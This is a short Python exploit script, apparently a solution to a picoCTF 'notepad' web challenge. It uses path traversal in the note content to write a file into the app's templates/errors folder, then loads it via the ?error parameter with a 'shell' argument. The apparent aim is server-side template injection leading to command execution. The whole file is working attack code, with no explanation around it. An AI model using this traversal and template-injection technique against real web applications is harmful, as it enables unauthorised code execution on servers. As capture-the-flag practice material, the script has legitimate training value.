import sys
import requests

base_url = 'https://notepad.mars.picoctf.net'

payload_content = sys.argv[1]
path_content = '..\\templates\\errors\\test' + (128-len('..\\templates\\errors\\test'))*'a'
content = path_content + payload_content
shell = sys.argv[2]

# content = content.replace("_", "requests.args.get('v)")

response = requests.post(f'{base_url}/new', data={'content': content}, allow_redirects=False)
redirected_url = response.headers['Location']
filename = redirected_url.split('/')[-1]
print(f'[+] File created with name: {filename}')

# Now try to get the file with ?error param
response = requests.get(f'''{base_url}/?error={filename.rstrip(".html")}&c=_&shell={shell}''')
print('[+] Printing content of file')
print(response.text)


